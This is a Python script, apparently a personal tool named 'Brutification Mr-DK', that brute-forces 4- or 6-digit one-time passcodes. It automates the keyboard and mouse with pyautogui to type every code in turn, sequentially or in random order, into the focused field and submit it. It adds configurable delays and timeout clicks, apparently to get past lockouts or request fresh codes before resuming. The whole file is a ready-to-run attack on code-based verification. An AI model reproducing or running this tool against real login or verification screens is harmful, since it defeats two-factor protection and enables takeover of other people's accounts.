#!/usr/bin/python

import time
import sys
import json
import os
import pyautogui
import random

# File to store settings
SETTINGS_FILE = "bruteforce_settings.json"

# Default settings
default_settings = {
    "otp_length": 4,
    "start_range": 1001,
    "speed": 1.0,
    "timeout": 0,  # 0 means no timeout
    "mode": "sequential",  # Default mode
    "click_x": None,
    "click_y": None,
    "extra_click_x": None,  # New key for additional click location
    "extra_click_y": None
}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            settings = json.load(f)
            # Ensure all default settings are present
            for key in default_settings:
                if key not in settings:
                    settings[key] = default_settings[key]
            return settings
    else:
        return default_settings.copy()

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f)

def display_menu(settings):
    clear_screen()
    print("\n--- Brutification Mr-DK ---")
    print(f"1. Start brute force (Mode: {settings['mode']})")
    print("2. Set OTP length (4 or 6)")
    print(f"3. Set starting range (current: {settings['start_range']})")
    print(f"4. Set entry speed (current: {settings['speed']} seconds)")
    print(f"5. Set timeout (current: {settings['timeout']} minutes)")
    print(f"6. Set brute force mode (current: {settings['mode']})")
    print("7. Set click location for timeout (current: {}, {})".format(settings['click_x'], settings['click_y']))
    print("8. Set additional click location (current: {}, {})".format(settings['extra_click_x'], settings['extra_click_y']))
    print("9. Exit")
    choice = input("Enter your choice (1-9): ")

    if not choice.isdigit() or int(choice) not in range(1, 10):
        print("Invalid choice! Please enter a number between 1 and 9.")
        return display_menu(settings)
    
    return int(choice)

def set_otp_length(settings):
    length = input(f"Enter OTP length (4 or 6, current: {settings['otp_length']}): ")
    if length not in ['4', '6']:
        print("Invalid OTP length! Please enter 4 or 6.")
    else:
        settings['otp_length'] = int(length)
        save_settings(settings)

def set_starting_range(settings):
    start_range_input = input(f"Enter starting range for OTP (e.g., 1001, current: {settings['start_range']}): ")
    if not start_range_input.isdigit():
        print("Invalid starting range! Please enter a numeric value.")
    else:
        settings['start_range'] = int(start_range_input)
        save_settings(settings)

def set_speed(settings):
    speed_input = input(f"Enter delay between attempts in seconds (e.g., 0.5 for faster, 1 for normal, current: {settings['speed']}): ")
    try:
        speed = float(speed_input)
        if speed < 0:
            raise ValueError
        settings['speed'] = speed
        save_settings(settings)
    except ValueError:
        print("Invalid speed! Please enter a positive number.")

def set_timeout(settings):
    timeout_input = input(f"Enter timeout in minutes (0 for no timeout, current: {settings['timeout']}): ")
    try:
        timeout = int(timeout_input)
        if timeout < 0:
            raise ValueError
        settings['timeout'] = timeout
        save_settings(settings)
    except ValueError:
        print("Invalid timeout! Please enter a non-negative integer.")

def set_mode(settings):
    mode = input(f"Enter brute force mode (sequential or random, current: {settings['mode']}) ").lower()
    if mode not in ['sequential', 'random']:
        print("Invalid mode! Please enter 'sequential' or 'random'.")
    else:
        settings['mode'] = mode
        save_settings(settings)

def set_click_location(settings):
    print("Move your mouse to the desired click location and press Enter.")
    time.sleep(5)  # Give time to move the cursor
    x, y = pyautogui.position()
    settings['click_x'] = x
    settings['click_y'] = y
    save_settings(settings)
    print(f"Click location set to: ({x}, {y})")

def set_extra_click_location(settings):
    print("Move your mouse to the additional click location and press Enter.")
    time.sleep(5)  # Give time to move the cursor
    x, y = pyautogui.position()
    settings['extra_click_x'] = x
    settings['extra_click_y'] = y
    save_settings(settings)
    print(f"Additional click location set to: ({x}, {y})")

def brute_force_otp(settings):
    print("Starting brute force in 5 seconds...")
    time.sleep(5)
    
    max_value = 10**settings['otp_length'] - 1
    start_time = time.time()
    timeout_seconds = settings['timeout'] * 60

    if settings['mode'] == 'sequential':
        otp_range = range(settings['start_range'], max_value + 1)
    elif settings['mode'] == 'random':
        otp_range = random.sample(range(settings['start_range'], max_value + 1), max_value + 1 - settings['start_range'])
    else:
        print("Invalid mode selected. Defaulting to sequential.")
        otp_range = range(settings['start_range'], max_value + 1)
    
    while True:
        for otp in otp_range:
            otp_str = str(otp).zfill(settings['otp_length'])
            
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.typewrite(otp_str, interval=0.0000000000005)  # Speed up typing
            pyautogui.press('enter')

            print(f"Trying OTP: {otp_str}")

            time.sleep(settings['speed'])  # Delay between attempts
            
            # Check timeout
            if settings['timeout'] > 0 and (time.time() - start_time) >= timeout_seconds:
                print("Timeout reached. Clicking button location and additional click location before restarting brute force.")
                print("Waiting 15 seconds before restarting brute force...")
                time.sleep(15)  # Wait for 30 seconds before restarting
                if settings['click_x'] is not None and settings['click_y'] is not None:
                    pyautogui.click(x=settings['click_x'], y=settings['click_y'])
                    time.sleep(2)  # Wait for 30 seconds before restarting
                if settings['extra_click_x'] is not None and settings['extra_click_y'] is not None:
                    pyautogui.click(x=settings['extra_click_x'], y=settings['extra_click_y'])
                

                
                start_time = time.time()  # Reset start time
                break
        else:
            break

def main():
    settings = load_settings()
    
    while True:
        choice = display_menu(settings)
        
        if choice == 1:
            brute_force_otp(settings)
        elif choice == 2:
            set_otp_length(settings)
        elif choice == 3:
            set_starting_range(settings)
        elif choice == 4:
            set_speed(settings)
        elif choice == 5:
            set_timeout(settings)
        elif choice == 6:
            set_mode(settings)
        elif choice == 7:
            set_click_location(settings)
        elif choice == 8:
            set_extra_click_location(settings)
        elif choice == 9:
            sys.exit()
        else:
            print("Invalid option! Please select a valid option.")

if __name__ == "__main__":
    main()
